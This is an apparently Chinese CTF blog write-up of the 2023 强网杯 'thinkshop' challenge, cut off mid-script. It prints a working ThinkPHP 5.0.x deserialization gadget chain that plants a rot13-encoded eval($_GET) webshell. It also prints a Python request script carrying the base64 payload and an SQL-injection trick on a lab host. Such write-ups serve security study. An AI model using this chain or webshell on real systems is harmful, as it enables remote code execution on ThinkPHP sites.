@@ -1,0 +1,324 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>强网杯2023部分题目复盘 | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 前言针对其他战队或者师傅写的WP，对印象比较深刻的几个赛题进行复现与总结 0x02 赛题复盘1.thinkshop题目中给有附件，是docker直接导出的环境，执行 docker load 命令后就是题目镜像了，可以进入镜像把题目源码打包下来，进行分析与调试。题目源码打包下来并不是全部能跑，看报错知道要用到一个 Memcached 的缓存插件，我下载这个插件后还是报错，也不知道问题出在哪">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2023部分题目复盘">
+<meta property="og:url" content="https://xilitter.github.io/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="0x01 前言针对其他战队或者师傅写的WP，对印象比较深刻的几个赛题进行复现与总结 0x02 赛题复盘1.thinkshop题目中给有附件，是docker直接导出的环境，执行 docker load 命令后就是题目镜像了，可以进入镜像把题目源码打包下来，进行分析与调试。题目源码打包下来并不是全部能跑，看报错知道要用到一个 Memcached 的缓存插件，我下载这个插件后还是报错，也不知道问题出在哪">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a10.jpg">
+<meta property="article:published_time" content="2023-12-21T11:40:07.000Z">
+<meta property="article:modified_time" content="2024-01-03T12:20:48.031Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a10.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '强网杯2023部分题目复盘',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-01-03 20:20:48'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a10.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">强网杯2023部分题目复盘</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-12-21T11:40:07.000Z" title="发表于 2023-12-21 19:40:07">2023-12-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-01-03T12:20:48.031Z" title="更新于 2024-01-03 20:20:48">2024-01-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%B5%9B%E9%A2%98%E8%AE%B0%E5%BD%95/">赛题记录</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>11分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="强网杯2023部分题目复盘"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>针对其他战队或者师傅写的WP，对印象比较深刻的几个赛题进行复现与总结</p>
+<h2 id="0x02-赛题复盘"><a href="#0x02-赛题复盘" class="headerlink" title="0x02 赛题复盘"></a>0x02 赛题复盘</h2><h3 id="1-thinkshop"><a href="#1-thinkshop" class="headerlink" title="1.thinkshop"></a>1.thinkshop</h3><p>题目中给有附件，是docker直接导出的环境，执行 docker load 命令后就是题目镜像了，可以进入镜像把题目源码打包下来，进行分析与调试。题目源码打包下来并不是全部能跑，看报错知道要用到一个 Memcached 的缓存插件，我下载这个插件后还是报错，也不知道问题出在哪。</p>
+<p>题目后台登录也是我比较迷的一点，有了题目docker环境，可以直接进数据库里看到账号密码</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/1.png" class>
+
+<p>password经过cmd5解密为123456，但是账号密码为 1 123456才能登录到后台</p>
+<p>find 应该传键值对进去，但是默认把username字符串传进去了，所以默认是查询主键id（有点迷）</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/2.png" class>
+
+<p>首先发现了在goods.html里有反序列化的操作</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/3.png" class>
+
+<p>可以打反序列化，题目使用了thinkphp框架，并且是5.0.23版本，百度搜索5.0.24 反序列化的链子能用。接着就重点关注$goods[‘data’] 是否可控。</p>
+<p>在添加商品里</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/4.png" class>
+
+<p>显而易见的有可能可控的传参点，但是这里是个坑。我们可控的 $data[‘data’] 参数经过 markdownToArray 函数处理，而这个函数就是以换行为分隔符，把 $data[‘data’] 的值当作数组的键值，最终返回一个数组</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/5.png" class> 
+
+<p>所以这个地方并不可控，当时比赛的时候也想到了如果能直接修改数据库就好了。</p>
+<p>在修改商品处</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/6.png" class>
+
+<p>可控的data经过 saveGoods 方法，函数跟到底，最终会做一个数据库的更新操作</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/7.png" class>
+
+<p>将 key 和 value 拼接在数据库里，value不可控，我们可以控制key</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/8.png" class>
+
+<p>键名拼接sql语句，rtrim 函数会除去空格，所以用&#x2F;**&#x2F;代替空格，而处理键值对后最终效果就是</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/9.png" class>
+
+<p>将第一个商品的data数据更新为66，这样就可以goods表中任意写数据了</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pipes</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Windows</span> <span class="keyword">extends</span> <span class="title class_">Pipes</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">private</span> <span class="variable">$files</span> <span class="operator">=</span> [];</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">#Relation</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Relation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">protected</span> $selfRelation;</span><br><span class="line">    <span class="keyword">protected</span> $query;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();#<span class="keyword">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">#OneToOne HasOne</span><br><span class="line">use think\model\Relation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">OneToOne</span> <span class="keyword">extends</span> <span class="title class_">Relation</span></span><br><span class="line">&#123;</span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HasOne</span> <span class="keyword">extends</span> <span class="title class_">OneToOne</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">protected</span> <span class="variable">$bindAttr</span> <span class="operator">=</span> [];</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        parent::__construct();</span><br><span class="line">        $<span class="built_in">this</span>-&gt;bindAttr = [<span class="string">&quot;no&quot;</span>, <span class="string">&quot;123&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">#Output</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Output</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">private</span> <span class="variable">$handle</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">protected</span> <span class="variable">$styles</span> <span class="operator">=</span> [];</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Memcached</span>();<span class="comment">//目的调用其write()</span></span><br><span class="line">        $<span class="built_in">this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think;</span><br><span class="line">#Model</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">use think\console\Output;</span><br><span class="line">use think\db\Query;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Model</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">protected</span> <span class="variable">$append</span> <span class="operator">=</span> [];</span><br><span class="line">    <span class="keyword">protected</span> $error;</span><br><span class="line">    <span class="keyword">public</span> $parent;#修改处</span><br><span class="line">    <span class="keyword">protected</span> $selfRelation;</span><br><span class="line">    <span class="keyword">protected</span> $query;</span><br><span class="line">    <span class="keyword">protected</span> $aaaaa;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;parent = <span class="keyword">new</span> <span class="title class_">Output</span>();#Output对象,目的是调用__call()</span><br><span class="line">        $<span class="built_in">this</span>-&gt;append = [<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">        $<span class="built_in">this</span>-&gt;error = <span class="keyword">new</span> <span class="title class_">HasOne</span>();<span class="comment">//Relation子类,且有getBindAttr()</span></span><br><span class="line">        $<span class="built_in">this</span>-&gt;selfRelation = <span class="literal">false</span>;<span class="comment">//isSelfRelation()</span></span><br><span class="line">        $<span class="built_in">this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\db;</span><br><span class="line">#Query</span><br><span class="line">use think\console\Output;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Query</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">protected</span> $model;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">#Memcached</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Memcached</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">protected</span> <span class="variable">$handler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">File</span>();<span class="comment">//目的调用File-&gt;set()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">#File</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">File</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">protected</span> <span class="variable">$options</span> <span class="operator">=</span> [];</span><br><span class="line">    <span class="keyword">protected</span> $tag;</span><br><span class="line"></span><br><span class="line">    function <span class="title function_">__construct</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="built_in">this</span>-&gt;options = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?&gt;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">        ];</span><br><span class="line">        $<span class="built_in">this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line"></span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pivot</span> <span class="keyword">extends</span> <span class="title class_">Model</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">use think\process\pipes\Windows;</span><br><span class="line">echo <span class="title function_">base64_encode</span><span class="params">(serialize([new Windows()</span>]));</span><br></pre></td></tr></table></figure>
+
+<p>借用一师傅写的sql注入脚本</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.111.146:36000/public/index.php/index/admin/do_edit.html&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;mgsjnp8i87dae49ocrd5mubar7&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">exp = <span class="string">&quot;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&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;price&#x27;</span>: <span class="string">&#x27;1.00&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;on_sale_time&#x27;</span>: <span class="string">&#x27;2023-12-16T21:20&#x27;</span>,</span><br><span class="line">    <span 